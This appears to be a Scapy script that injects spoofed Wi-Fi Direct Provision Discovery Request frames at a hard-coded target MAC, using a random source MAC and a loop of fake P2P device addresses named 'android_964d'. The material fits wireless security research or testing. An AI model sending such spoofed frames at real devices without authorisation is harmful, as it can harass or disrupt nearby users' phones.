from scapy.all import *
import time

iface = "wlan0"
# target = "02:1a:11:ff:b1:53"
target = "52:68:0a:09:a8:e1"
mac = RandMAC()
dot11 = Dot11FCS(addr1=target, addr2=mac)
action = Dot11Action(category='Public')
fixed_param = Raw(
    b"\x09" # Vendor Specific
    b"\x50\x6f\x9a" # OUI
    b"\x09" # WFA Subtype: P2P
    b"\x07" # PD Request
    b"\x01" # Dialog Token
)
p2p = Dot11EltVendorSpecific(
    oui=0x506f9a,
    info=(
        b"\x09" # OUI Type
        b"\x02\x02\x00\x25\x00" # P2P Capability
        b"\x0d\x21\x00"
        b"" # P2P Device address
        b"\x01\x88\x00\x0a\x00\x50\xf2\x04\x00\x05\x00\x10\x11"
        b"" # Device Name attribute length
        b"" # Device Name
    )
)
wps = Dot11EltVendorSpecific(
    oui=0x0050f2,
    info=b"\x04\x10\x08\x00\x02\x00\x80"
)

def build_p2p(device_address, device_name):
    dev_name = get_dev_name(device_name)
    dev_name_len = get_dev_name_len(device_name)
    p2p = Dot11EltVendorSpecific(
        oui=0x506f9a,
        info=(
            b"\x09" # OUI Type
            b"\x02\x02\x00\x25\x00" # P2P Capability
            b"\x0d\x21\x00"
            +device_address+ # P2P Device address
            b"\x01\x88\x00\x0a\x00\x50\xf2\x04\x00\x05\x00\x10\x11"
            +dev_name_len # Device Name attribute length
            +dev_name # Device Name
        )
    )
    return p2p

def get_dev_name(device_name):
    return device_name.encode()

def get_dev_name_len(device_name):
    return struct.pack(">H", len(device_name))

device_address_list = [
    b"\x52\x55\x27\xf1\x25\x91",
    b"\x52\x55\x27\xf1\x25\x92",
    b"\x52\x55\x27\xf1\x25\x93",
    b"\x52\x55\x27\xf1\x25\x94",
    b"\x52\x55\x27\xf1\x25\x95",
]

if __name__ == "__main__":
    # for device_address in device_address_list:
    #     new_raw_data = raw_data.replace(target, device_address)
    #     action[Raw] = Raw(new_raw_data)
    #     pd_request = RadioTap()/dot11/action
    #     sendp(pd_request, iface=iface, count=1)
    #     time.sleep(0.1)
    # build_p2p(b"\x52\x55\x27\xf1\x25\x91", "android").show()
    for dev_addr in device_address_list:
        pd_request = RadioTap()/dot11/action/fixed_param/build_p2p(dev_addr, "android_964d")/wps
        sendp(pd_request, count=1, iface=iface)
        time.sleep(0.1)